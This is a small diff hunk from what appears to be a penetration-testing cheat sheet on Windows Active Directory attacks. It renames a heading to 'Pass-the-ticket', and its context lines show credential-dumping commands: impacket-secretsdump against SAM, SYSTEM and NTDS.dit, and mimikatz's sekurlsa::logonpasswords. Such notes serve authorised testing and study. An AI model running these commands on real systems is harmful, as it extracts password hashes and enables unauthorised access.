@@ -202,7 +202,7 @@ impacket-secretsdump -sam SAM(local SAM file) -system SYSTEM(local SYSTEM file) 
 impacket-secretdump -ntds NTDS.dit(C:\windows\ntds\) -system SYSTEM local0
 ```
 
-### Abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket(TGT) and gain rce
+### Pass-the-ticket
 https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
 ```
 sekurlsa::logonpasswords
